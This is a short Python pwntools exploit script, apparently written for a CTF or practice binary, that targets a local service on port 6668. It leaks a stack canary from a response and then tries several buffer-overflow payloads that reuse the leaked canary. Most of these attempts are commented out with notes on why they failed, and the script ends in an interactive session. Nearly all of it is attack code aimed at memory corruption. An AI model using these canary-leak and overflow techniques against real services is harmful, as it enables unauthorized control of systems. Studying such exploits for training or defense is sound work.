#!/usr/bin/python3
from pwn import *

client = remote("localhost",6668)

client.sendline(b'L TABLE XXXXX')
canary = client.recv()[104:112]
canary = p64(u64(canary))
print(canary)

client.sendline(b'L TABLE CHAIR') #must connect first, otherwise we will get stack smashing next
print(client.recv())

#client.send(b'L '+ b'A'*201  ) # stack smashing

#NOT ENTERING A PASSWORD, but only FAKE username
#client.send(b'L '+ b'A'*200 + canary + p64(0x7)) # *** buffer overflow detected ***: terminated

#client.sendline(b'L TABLE '+  b'A'*168 + canary+ p64(0x5)+b'Z'*8+ p64(0x3)+b'Y'*5000) # stack smashing

client.send(b'I'+ b'A'*3000  ) # won't help to overflow (2006 <2112
print(client.recv())

client.interactive()
